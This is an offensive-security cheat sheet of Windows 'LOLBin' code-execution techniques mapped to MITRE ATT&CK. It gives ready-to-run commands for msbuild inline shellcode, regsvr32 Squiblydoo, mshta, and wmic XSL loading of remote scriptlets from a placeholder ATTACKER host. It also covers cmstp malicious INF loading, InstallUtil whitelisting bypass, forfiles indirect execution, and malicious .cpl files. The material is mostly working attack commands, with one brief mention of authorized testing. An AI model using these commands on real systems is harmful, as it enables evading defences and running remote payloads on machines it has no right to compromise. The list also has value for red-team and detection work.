# LOLBins Code Execution

## MSBuild (T1127.001)
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
- XML contains inline C# with shellcode; compiles and executes in memory
- Use a purpose-built C# proof payload that matches the authorized test objective

## regsvr32 / Squiblydoo (T1218.010)
```cmd
regsvr32.exe /s /i:http://ATTACKER/back.sct scrobj.dll
```
- Loads remote .sct scriptlet containing JScript payload
- Process exits quickly after execution

## MSHTA (T1218.005)
```cmd
mshta.exe javascript:a=(GetObject("script:http://ATTACKER/m.sct")).Exec();close();
```
- Executes remote scriptlet via mshta.exe (HTML Application Host)

## CMSTP (T1218.003)
```cmd
cmstp.exe /s /ns c:\path\evil.inf
```
- .inf file RegisterOCXs section loads malicious DLL

## InstallUtil (T1218.004)
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe payload.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```
- Executes code in Uninstall() method, bypasses whitelisting

## Forfiles (T1202)
```cmd
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
```
- Indirect command execution without cmd.exe as parent

## WMIC + XSL
```cmd
wmic os get /FORMAT:"http://ATTACKER/evil.xsl"
```
- XSL file contains JScript payload; spawns under svchost.exe
- Note: WMIC deprecated in Windows 11 / Server 2025 (removed from default install)

## Control Panel Items (T1218.002)
- Compile DLL exporting `CPlApplet`; rename to .cpl
- Execute: `control.exe evil.cpl` or double-click
